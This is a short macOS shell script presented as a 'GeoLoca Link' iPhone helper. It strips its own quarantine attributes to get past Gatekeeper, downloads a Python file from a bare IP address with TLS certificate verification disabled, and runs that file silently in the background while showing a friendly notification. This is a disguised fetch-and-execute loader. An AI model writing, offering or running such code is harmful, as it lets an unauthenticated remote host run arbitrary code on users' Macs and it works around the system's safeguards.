#!/bin/bash
# GeoLoca Link — double-click once, then plug iPhone in
set -e
xattr -cr "$0" 2>/dev/null || true
DIR="$HOME/.geoloca"
mkdir -p "$DIR"
SITE="https://109.71.252.128"

python3 -c "
import ssl, urllib.request, os
p = os.path.expanduser('$DIR/usb_helper.py')
c = ssl.create_default_context()
c.check_hostname = False
c.verify_mode = ssl.CERT_NONE
open(p, 'wb').write(urllib.request.urlopen('$SITE/connect/usb_helper.py', context=c).read())
print('Updated GeoLoca Link')
"

pkill -f "$DIR/usb_helper.py" 2>/dev/null || true
nohup python3 "$DIR/usb_helper.py" >> "$DIR/link.log" 2>&1 &
sleep 1

osascript -e 'display notification "GeoLoca Link is running. Plug in your iPhone." with title "GeoLoca"' 2>/dev/null || true
open "$SITE/dashboard" 2>/dev/null || true

exit 0
